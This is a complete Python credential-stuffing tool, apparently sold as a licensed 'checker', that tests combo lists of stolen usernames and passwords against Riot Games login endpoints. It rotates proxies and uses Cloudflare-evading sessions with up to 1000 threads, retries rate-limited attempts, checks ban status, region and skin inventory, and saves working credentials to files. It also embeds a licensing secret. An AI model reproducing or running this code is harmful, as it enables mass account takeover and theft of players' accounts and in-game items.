import ssl
from typing import Any
from cProfile import run
from cmath import log
from importlib import invalidate_caches
from math import comb
import threading, requests, cloudscraper, time, random, string, os, easygui, ctypes, sys, hashlib, datetime, readchar, pandas, traceback, riotchecker, shutil
from xmlrpc.client import boolean
from colorama import init, Fore
from keyauth import api
from re import compile
init(convert=True)

from collections import OrderedDict
from urllib3 import PoolManager
from ssl import PROTOCOL_TLSv1_2
from requests.adapters import HTTPAdapter
from requests.exceptions import Timeout
from threading import Thread

lock = threading.Lock()
e = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H")

red = Fore.RED
black = Fore.BLACK
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
mov = Fore.MAGENTA
cyan = Fore.CYAN
wht = Fore.WHITE
reset = Fore.RESET
lb = Fore.LIGHTBLUE_EX
grey = Fore.LIGHTBLACK_EX
lr = Fore.LIGHTRED_EX
lg = Fore.LIGHTGREEN_EX

ProxyList = []
combos = []
xds = []
valid = 0
invalid = 0
retry = 0
auth = 0
rated = 0
multifac = 0
checked = 0
unbanned = 0
banned = 0
EmailV = 0
skinned = 0 
no_skins = 0

startt = 0 


if not os.path.exists("results"):
    os.makedirs("results/")
if not os.path.exists("results/{}".format(current_date)):
    os.makedirs("results/{}".format(current_date))
#    if not os.path.exists("results/brute"):
#        os.makedirs("results/brute/")
#    if not os.path.exists("results/brute/{}".format(current_date)):
#        os.makedirs("results/brute/{}".format(current_date))
#    if not os.path.exists("results/brute/{}/region".format(current_date)):
#        os.makedirs("results/brute/{}/region/".format(current_date))

#    if not os.path.exists("results/proxies".format(current_date)):
#        os.makedirs("results/proxies".format(current_date))
#
#    if not os.path.exists(f"results/{current_date}/brutechecker"):
#       os.makedirs(f"results/{current_date}/brutechecker/")

title = f'''
                                {red}⢀⣀⣀⠀⠀⠀⠀⠀{reset}⢀⣀⣀⣀⣀⣀⡀
                                {red}⠈⢿⣿⣆⠀⠀⠀{reset}⣠⣿⣿⣿⣿⣿⠏
                                {red}⠀⠈⢻⣿⣦⠀⣰⣶⡶{lr}⢂{reset}⣾⣿⠋
                                {red}⠀⠀⠀⢻⣿⣿⣿⡟{lr}⢡{reset}⣿⣿⠃⠀⠀
                                {red}⠀⠀⠀⠈⢻⣿⡿{lr}⢡{reset}⣾⣿⠏⠀⠀⠀
                                {red}⠀⠀⠀⠀⠀⠟{reset}⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                {red}⠀⠀⠀⠀⠀⠀{reset}⠹⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                {red}⠀⠀⠀⠀⠀⠀⠀{reset}⠁
                '''

CIPHERS = [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE+AES128',
    'RSA+AES128',
    'ECDHE+AES256',
    'RSA+AES256',
    'ECDHE+3DES',
    'RSA+3DES'
]

class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *a: Any, **k: Any) -> None:
        c = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        c.set_ciphers(':'.join(CIPHERS))
        k['ssl_context'] = c
        return super(SSLAdapter, self).init_poolmanager(*a, **k)

def getcombos():
    global path
    try:
        print(f'    [{red}>{reset}] Path to combo file > ')
        time.sleep(1)
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'FXCK . EXE - Select combos', multiple= False)
        with open(path, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                combos.append(line)
                xds.append(line)
        first_line = combos[0]
        shutil.copyfile(path, f"results/{current_date}/remain_accs.txt")
    except:
        print(f'\n {lr}!{reset} Failed to open combofile')
        os.system('pause >nul')
        quit()


def getproxies():
    try:
        print(f'    [{red}>{reset}] Path to proxy file > ')
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'FXCK - Select proxy', multiple= False)
        with open(path, "r+", encoding="utf-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                ProxyList.append(line)
    except Exception:
        print("Error has occurred")

cpm = 0
def cpmrunner():
    global cpm
    while True:
        oldchecked = valid + invalid
        time.sleep(1)
        newchecked = invalid + valid
        cpm = (newchecked - oldchecked) * 60

def session1():
        session = requests.Session()
        session.trust_env = False
        return session

def checkacc(combo):
    global valid, invalid, retry, auth, rated, multifac, checked, unbanned, banned, xds, startt, no_skins, skinned
    try:
        elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - startt))
        ctypes.windll.kernel32.SetConsoleTitleW(f"VALX | Valid: {valid} | Bad: {invalid} | unbanned/banned: {unbanned}/{banned} | Rate-limted: {rated} | un/skinned: {no_skins}/{skinned} | Retries: {retry} | Checked: {checked}/{len(xds)} | CPM: {cpm} | Elapsed : {elapsed}")
    except Exception as e:
        print(e)

    try:
        try:
            username, password = combo.split(":")
        except:
            combos.append(combo)
            return
        proxy = random.choice(ProxyList)
        UseProxy = f'''http://{proxy}'''
        proxies = {
            'https' : UseProxy,
            'http' : UseProxy}   
        mod_password = password[0:3]
        session = requests.Session()
        session.headers = OrderedDict({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36","Accept-Language": "en-US,en;q=0.9","Accept": "application/json, text/plain, */*"})
        session.mount('https://', SSLAdapter())
        scraper = cloudscraper.create_scraper(sess=session)
        nonce = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(23))
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": f'{nonce}',
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }
        try:
            r = scraper.post('https://auth.riotgames.com/api/v1/authorization', json=data, proxies=proxies, headers=headers, timeout=10)
        except:
            retry += 1
            combos.append(combo)
            return
        if r.status_code == 200:
            data = {
                'type': 'auth',
                'username': username,
                'password': password
            }

            login = scraper.put('https://auth.riotgames.com/api/v1/authorization', json=data, proxies=proxies, headers=headers, timeout=5)
            data = login.json()


            if "access_token" in login.text:
                validlogintxt = open(f"results/{current_date}/valid.txt", "a+", encoding="utf-8")
                validlogintxt.write(f"{username}:{password}\n")
                validlogintxt.close()

                #lock.acquire()
                #print(f'[{lr}+{reset}] {username}:{password}{reset}')
                #lock.release()

                #checked += 1

                pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
                data = pattern.findall(data['response']['parameters']['uri'])[0]
                token = data[0]
                token_id = data[1]


            elif "You do not have access to auth.riotgames.com" in login.text: 
                retry += 1
                combos.append(combo)
                return
            elif "auth_failure" in login.text or "invalid_session_id" in login.text or "archived_account" in login.text:
                invalid += 1
                checked += 1
                return
            elif "multifactor" in login.text:
                multifac += 1
                checked += 1
                open(f"results/2fa.txt", "a+", encoding="utf-8").write(f"{username}:{password}\n")
                return
            elif "rate_limited" in login.text:
                rated += 1
                checked += 1
                combos.append(combo)
                return
            else:
                pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
                data = pattern.findall(data['response']['parameters']['uri'])[0]
                token = data[0]

            #checks ban
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'Authorization': f'Bearer {token}',
            }
            try:
                r = scraper.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={}, proxies=proxies)
                entitlement = r.json()['entitlements_token']

                r = scraper.post('https://auth.riotgames.com/userinfo', headers=headers, json={}, proxies=proxies)
                data = r.json()   
            except Exception as e:
                retry += 1
                combos.append(combo)
                return
            try:
                GameName =  r.text.split('game_name":"')[1].split('"')[0]
            except Exception as e:
                GameName = "null" 
            CountryID = r.text.split('country":"')[1].split('"')[0]
            try:            
                Tag = r.text.split('tag_line":"')[1].split('"')[0]
            except Exception as e:
                Tag = "null"
            Sub = r.text.split('sub":"')[1].split('"')[0]
            EmailVerified = r.text.split('email_verified":')[1].split(',"')[0]
            data1 = data['acct']
            unix_time = data1['created_at']
            unix_time = int(unix_time)
            result_s = pandas.to_datetime(unix_time,unit='ms')
            str(result_s)        
            typebanned = None
            result_s1 = None
            try:
                data = r.json()
                data2 = data['ban']
                data3 = data2['restrictions']
                for x in data3:
                    typebanned = x['type']
                if typebanned == "PERMANENT_BAN" or typebanned == "PERMA_BAN":
                    typebanned = "Banned"
                    checked += 1
                    banned += 1
                    return

                elif typebanned == "TIME_BAN":
                    typebanned = "Time Banned"
                    notbannostying = open(f"results/{current_date}/timeban.txt", "a+", encoding="utf-8")
                    notbannostying.write(f"{username}:{password}\n")
                    notbannostying.close()
                    checked += 1
                    banned += 1
                    return

                elif typebanned == "PBE_LOGIN_TIME_BAN" or typebanned == "LEGACY_BAN":
                    typebanned = "Banned"
                    checked += 1
                    banned += 1
                    return
                        
                elif typebanned == None:
                    typebanned = "Unbanned"
                    nobannostying = open(f"results/{current_date}/unbanned .txt", "a+", encoding="utf-8")
                    nobannostying.write(f"{username}:{password}\n")
                    nobannostying.close()
            except:
                print(f'{red}ERROR{reset} - Writing {username}:{password} to file')
                failedsaves = open(f"results/{current_date}/failedsaves.txt", "a+", encoding="utf-8")
                failedsaves.write(f"{username}:{password}\n")
                failedsaves.close()
                return
            headers ={
                "X-Riot-Entitlements-JWT": entitlement,
                "Authorization": f"Bearer {token}"
            }
            try:
                json = {"id_token": token_id}
                r = scraper.put('https://riot-geo.pas.si.riotgames.com/pas/v1/product/valorant',json=json, headers=headers)
                data = r.json()
                Region = data['affinities']['live']
            except:
                Region = "na"
            if Region == "eu":
                Region = "eu"
            elif Region == "na":
                Region = "na"
            elif Region == "kr":
                Region = "kr"
            elif Region == "ap":
                Region = "ap"
            elif Region == "latam":
                Region = "na"
            elif Region == "br":
                Region = "na"

            try:
                r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
            except Exception as e:
                retry += 1
                combos.append(combo)
                return
            response_API = requests.get('https://valorant-api.com/v1/weapons/skins/?language=en-US')
            response = response_API.text
            userSkins = []
            SkinNumber = 0
            SkinStr = ""
            SkinStr2 = ""
            Skins = r.json()["Entitlements"]
            for skin in Skins:
                skinid = skin['ItemID'].lower()
                skin = response.split(skinid)[1].split(',')[1].replace('"displayName":"','').replace('\\"','').replace('"','').replace('u00A0','').replace("'",'')
                if skin in SkinStr or skin in SkinStr2:
                    pass
                else:
                    if "Level" in skin:
                        pass
                    else:
                        userSkins.append(skin)
            skin_amount = len(userSkins)
            skin_amount = int(skin_amount)
            if skin_amount == 0:
                no_skins += 1
            elif skin_amount in range(1, 999):
                skinned += 1
                nobasnnostying = open(f"results/{current_date}/skinned.txt", "a+", encoding="utf-8")
                nobasnnostying.write(f"{username}:{password}\n")
                nobasnnostying.close()
            #first_chars_pass = password[0:3]
            #first_chars_user = username[0:3]
            unbanned += 1
            checked += 1
            valid += 1
            with lock:
                print(f'[{lr}+{reset}] {username}:{password}{reset} {red}|{reset} Email verified > {EmailVerified} {reset} {red}|{reset} Region > {Region} {red}|{reset} Skins > {skin_amount}')
        else:
            retry += 1
            combos.append(combo)
            return

    except Exception as e:
        retry += 1
        combos.append(combo)
        return

def start():
    global combos, gc, startt, valid, invalid, checked, unbanned, banned, no_skins, skinned
    os.system("cls")
    print(title)
    getcombos()
    getproxies()
    print(" ? ~ Threads ~ max 1000")
    try:
        threads = int(input(" ~ "))
    except Exception:
        print(" ~ Invalid input ")
        time.sleep(2)
        start()
    if threads > 1000:
        print(f" ~ Maximum thread value is {red}1000{reset}")
        time.sleep(2)
        start()
    os.system("cls")
    startt = time.time()
    threading.Thread(target=cpmrunner, daemon =True).start()
    print(title)
    num = 0
    while True:
        if threading.active_count() <= int(threads):
            if len(combos) >= num:
                try:
                    num += 1
                    threading.Thread(target=checkacc, args=({combos[num]}), daemon =True).start()
                except Exception as e:
                    if (len(xds)<=checked):
                        print(f"Checked : {checked} | Valid : {valid} | Invalid : {invalid} | Un/Banned : {unbanned}/{banned}")
                        input()
                    else:
                        num -= 1

def close():
    os.system("cls")
    print(title)
    e = input(" ~ Are u sure u want to exit( y / n ) ")
    if e == "y":
        os._exit()
    elif e == "n":
        main()
    else:
        close()


def main():
    ctypes.windll.kernel32.SetConsoleTitleW(f"FXCK V1.3.5 | Menu")
    os.system("cls")
    print(title)
    print(f"    1 {red}~{reset} Start checker\n    2 {red}~{reset} Proxy Checker\n\n    x {red}~{reset} EXIT\n")
    c = repr(readchar.readkey()) 
    if c == "'1'":
        start()
    if c == "'2'":
        riotchecker.start()
    elif c == "'x'":
        os._exit()
    else:
        main()

def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest

keyauthapp = api(
    name = "valx",
    ownerid = "uKh7JDDPRN",
    secret = "703dd840ae5f5581f5603e695e569ca9d9953f24d05ad17dec17e7bf3eedce45",
    version = "1.0",
    hash_to_check = getchecksum()
)

def answer():
    ctypes.windll.kernel32.SetConsoleTitleW(f"Valx | Authentication")
    auto = "OFF"
    os.system("cls")
    print(title)
    try:
        print(f"""
        1 {red}~{reset} Login
        2 {red}~{reset} Register

        C {red}~{reset} Clear login.valx
        """)
        # ans = input(f" {red}[~]{reset} Select Option: ")
        ans = repr(readchar.readkey()) 
        if ans == "'1'":
            try:
                if os.stat("valx\\login.valx").st_size != 0:
                    with open("valx\\login.valx", "r+") as e:
                        for line in e.readlines():
                            if line != "":
                                user = line.split(':')[0].replace("\n", "")
                                passwor = line.split(':')[1].replace("\n", "")
                else:
                    user = input(f' {red}~{reset} username: ')
                    passwor = input(f' {red}~{reset} password: ')
                keyauthapp.login(user, passwor)
                with open("valx\\login.valx",'r+') as file:
                    file.truncate(0)
                open("valx\\login.valx", "w+").write(user + ":" + passwor)
            except:
                open("valx\\login.valx", "w+").write("")
                answer()
            time.sleep(0.25)
            main()
        elif ans == "'2'":
            user = input(f' {red}~{reset} username: ')
            passwor = input(f' {red}~{reset} password: ')
            license = input(f' {red}~{reset} License: ')
            open("valx\\login.valx", "w+").write(user + ":" + passwor)
            keyauthapp.register(user, passwor, license)
            time.sleep(0.25)
            main()
        elif ans == "'c'":
            with open("valx/login.valx",'r+') as file:
                    file.truncate(0)
            os.system('cls')
            print(title)
            answer()
        else:
            print(f"\n {lr}[{reset}~{lr}]{reset} Not Valid Option")
            time.sleep(1)
            os.system('cls')
            print(title)
            answer()
    except Exception as e:
        os._exit(1)

answer()